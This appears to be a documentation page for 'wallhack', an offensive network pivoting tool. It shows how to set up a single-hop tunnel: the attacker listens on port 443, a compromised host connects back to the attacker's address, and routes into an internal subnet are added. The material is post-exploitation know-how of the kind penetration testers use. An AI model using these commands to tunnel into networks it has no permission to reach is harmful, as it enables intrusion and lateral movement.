---
title: Single Hop
description: Establish a direct tunnel between an entry node and a single compromised host.
order: 7
---

# Single Hop

The most common deployment. A compromised host (`10.0.1.5`) connects back to your machine (`10.0.0.5`). Routes to the internal network are added through the tunnel.

{% steps %}
{% step title="Attacker (Entry)" number=1 %}
Listen for incoming connections.

{% codeblock code="wallhack entry --listen :443" /%}
{% /step %}

{% step title="Compromised Host (Exit)" number=2 %}
Connect back to the attacker.

{% codeblock code="./wallhack exit --connect 10.0.0.5:443" /%}
{% /step %}

{% step title="Configure Routes" number=3 %}
Add routes for the networks accessible through the compromised host.

```bash
ip route add 192.168.1.0/24 dev tun0
```
{% /step %}
{% /steps %}

{% trafficflow flow="10.0.0.5 (you) -> 10.0.1.5 (compromised) -> 192.168.1.0/24 (target)" label="Traffic Flow:" /%}
